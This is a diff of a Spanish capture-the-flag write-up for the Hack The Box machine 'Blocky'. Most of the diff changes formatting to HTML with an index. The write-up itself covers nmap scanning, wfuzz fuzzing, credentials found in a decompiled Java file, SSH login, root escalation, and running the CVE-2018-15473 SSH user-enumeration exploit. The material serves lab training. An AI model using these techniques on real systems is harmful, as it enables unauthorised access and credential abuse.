@@ -23,10 +23,53 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-blocky/blocky_logo.png)
+
 Esta es una máquina bastante sencilla, en donde haremos un **Fuzzing** y gracias a este descubriremos archivos de **Java**, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como **Root**. Además de que aprendemos a enumerar los usuarios del servicio **SSH**, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit **CVE-2018-15473**.
 
-# Recopilación de Información
-## Traza ICMP
+
+<br>
+<hr>
+<div id="Indice">
+	<h1>Índice</h1>
+	<ul>
+		<li><a href="#Recopilacion">Recopilación de Información</a></li>
+			<ul>
+				<li><a href="#Ping">Traza ICMP</a></li>
+				<li><a href="#Puertos">Escaneo de Puertos</a></li>
+				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+			</ul>
+		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#Fuzz">Fuzzing</a></li>
+			</ul>
+		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#SSH">Forma de Enumerar Usuarios de SSH</a></li>
+				<ul>
+                                        <li><a href="#PruebaExp">Probando Exploit: OpenSSH < 7.7 - Username Enumeration (2)</a></li>
+                                </ul>
+			</ul>
+		<li><a href="#Links">Links de Investigación</a></li>
+	</ul>
+</div>
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Ping">Traza ICMP</h2>
+
 Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL veremos que SO ocupa dicha máquina.
 ```
 ping -c 4 10.10.10.37                           
@@ -42,7 +85,8 @@ rtt min/avg/max/mdev = 132.548/133.548/134.989/0.910 ms
 ```
 Ok, el TTL nos dice que es una máquina con Linux, hagamos los escaneos.
 
-## Escaneo de Puertos
+<h2 id="Puertos">Escaneo de Puertos</h2>
+
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.37 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -81,7 +125,8 @@ Nmap done: 1 IP address (1 host up) scanned in 42.27 seconds
 
 Hay 4 puertos abiertos, 3 de ellos ya los conocemos, el FTP, el SSH y el HTTP, pero...Minecraft? que curioso, veamos que nos dice el escaneo de servicios.
 
-## Escaneo de Servicios
+<h2 id="Servicios">Escaneo de Servicios</h2>
+
 ```
 nmap -sC -sV -p21,22,80,25565 10.10.10.37 -oN targeted                  
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 14:58 CST
@@ -111,8 +156,21 @@ Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
 
 Analizando lo que nos dio el escaneo, el FTP no tiene activo el login **Anonymous** por lo que no sirve tratar de entrar por ahí, no tenemos credenciales del SSH, entonces tendremos que irnos por la página web del puerto HTTP.
 
-# Análisis de Vulnerabilidades
-## Analisando Puerto HTTP
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="HTTP">Analizando Puerto 80</h2>
+
 Veamos que nos dice la página:
 
 ![](/assets/images/htb-writeup-blocky/Captura1.png)
@@ -173,7 +231,8 @@ Va, una vez aquí intentemos ver si existe el usuario notch:
 
 ¡Si existe! Puede que ese usuario este registrado en el **SSH**, solo nos falta la contraseña. Ahora hagamos un Fuzzing para saber que otras subpáginas hay.
 
-## Fuzzing
+<h2 id="Fuzz">Fuzzing</h2>
+
 ```
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://blocky.htb/FUZZ/
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -273,7 +332,19 @@ En efecto, es una clase, veamos el contenido:
 
 ¿Es neta? jajaja que kgado, ya tenemos un usuario y la contraseña del Root, quiza **notch** es el Root o no sé, hay que probarlos.
 
-# Explotación de Vulnerabilidades
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
 Intentemos loguearnos con el usuario **notch**:
 ```
 ssh notch@10.10.10.37       
@@ -313,7 +384,19 @@ notch@Blocky:~$ cat user.txt
 ```
 Excelente, ya tenemos la flag del usuario, ahora falta convertirnos en Root.
 
-# Post Explotación
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
 Lo primero como siempre, vamos a ver que privilegios tenemos:
 ```
 notch@Blocky:~$ id
@@ -335,7 +418,8 @@ root@Blocky:~# cat root.txt
 ```
 ¡Listo! Que cosa más fácil.
 
-## Forma de Enumerar Usuarios de SSH
+<h2 id="SSH">Forma de Enumerar Usuarios de SSH</h2>
+
 Esta vez tuvimos suerte al intuir que existía un usuario, pero ¿cómo sabremos si existe un usuario en un servicio SSH en el futuro? Por ejemplo, en **Windows** podemos usar **Crackmapexec** para el servicio **Samba**, pero aquí eso no sirve así que hay que buscar una manera.
 
 Después de investigar un rato, gracias a **HackTricks** se puede enumerar los usuarios de un servicio **SSH** usando **Metasploit**, así que existe un Exploit que nos permita esto:
@@ -368,7 +452,8 @@ Papers: No Results
 ```
 Incluso hay varias versiones, pero probemos el **Username Enumeration (2)** porque el que encontramos en internet no funciona.
 
-### Probando Exploit: OpenSSH < 7.7 - Username Enumeration (2)
+<h3 id="PruebaExp">Probando Exploit: OpenSSH < 7.7 - Username Enumeration (2)</h3>
+
 ```
 searchsploit -m linux/remote/45939.py
   Exploit: OpenSSH < 7.7 - Username Enumeration (2)
@@ -417,11 +502,22 @@ OK, ya nada más se ve el resultado.
 
 Esta es una forma de saber si existe un usuario en un servicio SSH, para el futuro puede que nos sirva este Exploit.
 
-## Links de Investigación
+
+<br>
+<br>
+<div style="position: relative;">
+ <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+
 * http://java-decompiler.github.io/
 * https://stackoverflow.com/questions/41305479/how-to-check-if-username-is-valid-on-a-ssh-server
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
 * https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_enumusers/
 * https://www.exploit-db.com/exploits/45233
 
+
+<br>
 # FIN
